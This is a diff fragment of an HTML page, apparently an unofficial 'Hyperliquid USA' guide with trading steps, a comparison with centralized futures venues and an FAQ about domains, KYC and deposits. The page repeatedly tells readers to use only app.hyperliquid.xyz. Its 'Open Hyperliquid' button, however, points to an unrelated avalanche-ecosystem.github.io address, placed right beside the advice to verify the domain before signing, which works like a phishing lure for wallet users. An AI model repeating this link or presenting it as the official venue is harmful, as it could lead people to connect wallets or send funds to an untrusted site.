size, collateral, <a class="inline-link" href="https://www.investopedia.com/terms/l/liquidation.asp" rel="noopener noreferrer">liquidation price</a>, <a class="inline-link" href="https://www.binance.com/en/support/faq/what-is-funding-rate-and-how-to-check-it-360033525331" rel="noopener noreferrer">funding rate</a>, fee tier and order type. Perpetual futures can lose collateral quickly, and eligibility or protections may differ by jurisdiction.</div></div></section>
+  <section class="section"><div class="container"><h2>How to trade Hyperliquid USA</h2><ol class="steps"><li><b>Verify the domain</b><span>Use app.hyperliquid.xyz directly and avoid lookalike ads, redirects, or cloned interfaces.</span></li><li><b>Check availability</b><span>Review the app prompts and local rules before connecting a wallet or placing orders.</span></li><li><b>Connect a wallet</b><span>Open the official app, <a class="inline-link" href="https://ethereum.org/en/wallets/find-wallet/" rel="noopener noreferrer">connect a supported wallet</a>, and review deposit or onboarding steps carefully.</span></li><li><b>Trade deliberately</b><span>Use order controls, margin settings, funding data, and risk limits before entering any perp position.</span></li></ol><div class="cta-band"><div><p>Ready to trade?</p><p class="sub">Open the official Hyperliquid app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Hyperliquid ↗</a></div></div></section>
+  <section class="section"><div class="container"><h2>Hyperliquid USA vs centralized futures venues</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>Hyperliquid</th><th>Centralized futures venue</th></tr></thead><tbody><tr><td>Access model</td><td>Wallet or email access through app.hyperliquid.xyz</td><td>Account-based onboarding and KYC</td></tr><tr><td>Custody</td><td>User-controlled wallet access with deposits to the venue</td><td>Exchange account custody</td></tr><tr><td>Availability</td><td>Must check app restrictions and local rules</td><td>Region-specific product approval</td></tr><tr><td>Risk focus</td><td>Leverage, funding, liquidation and protocol/interface risk</td><td>Leverage, exchange custody and account restrictions</td></tr></tbody></table></div></div></section>
+  <section class="section section-alt" id="faq"><div class="container"><h2>Hyperliquid USA FAQ</h2><div class="faq-list"><details open><summary><h3>Is there a separate Hyperliquid USA website?</h3></summary><div>No verified separate US-specific Hyperliquid app is needed for normal navigation. The official trading app is app.hyperliquid.xyz, and users should verify that domain directly. A page claiming to be a special US mirror or faster onboarding path should be treated as suspicious unless it is linked by official Hyperliquid resources.</div></details><details><summary><h3>Can US residents trade on Hyperliquid?</h3></summary><div>Availability can depend on current app restrictions and local rules. Users should read official notices and should not bypass geographic or eligibility controls. This is not legal advice; it is a domain and risk-oriented answer for searchers trying to find the official venue safely.</div></details><details><summary><h3>What is the safest Hyperliquid URL for US searchers?</h3></summary><div>Use app.hyperliquid.xyz for the trading interface and verify it against the official Hyperliquid docs. Avoid sponsored search links, private-message links and cloned domains. Before depositing, confirm that the wallet or email login, destination address and network match the app's official flow.</div></details><details><summary><h3>Does Hyperliquid require KYC in the USA?</h3></summary><div>Hyperliquid onboarding in the official docs describes wallet access and email login rather than a conventional centralized exchange account flow. That does not answer legal eligibility. Users should check official app notices and local rules before using the product, especially because perps access can be restricted by jurisdiction.</div></details><details><summary><h3>Can I deposit from Coinbase to Hyperliquid?</h3></summary><div>The official Hyperliquid guide mentions moving funds from a centralized exchange to supported onboarding routes as an option, but users must choose the exact supported asset and network shown by the app. A common documented path is USDC on Arbitrum, with ETH needed for Arbitrum gas before depositing.</div></details><details><summary><h3>What risks matter most for Hyperliquid USA users?</h3></summary><div>The main risks are eligibility, leverage, liquidation, funding costs, deposit or withdrawal mistakes, app-domain spoofing and smart-contract or protocol risk. US users should be especially careful not to treat a search result as proof of availability. Start with the official app, read notices, and avoid workarounds.</div></details></div></div></section>
 </main>
 <footer class="site-footer"><div class="container">
-<nav aria-label="Footer" class="footer-nav"><a href="#how-it-works">How it works</a><a href="#costs-and-risk">Costs &amp; risk</a><a href="#hyperevm-and-hype">Hyperevm &amp; hype</a><a href="#core-surfaces">Core surfaces</a><a href="#pre-trade-checks">Pre trade checks</a><a href="#faq">FAQ</a></nav>
-<p class="footer-note">Not the official Hyperliquid app — verify the domain before connecting a wallet. Information on this page is for educational purposes only and is not financial advice.</p>
-<p class="footer-meta"><a href="#top">Back to top ↑</a></p>
+  <div class="footer-grid"></div>
+  <p class="footer-note">Not the official app; verify the app.hyperliquid.xyz domain and use this page for education only, not financial advice.</p>
+  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
 </div></footer>
-<script defer="" src="static/app.js"></script>
+<script src="static/app.js" defer></script>
 </body></html>
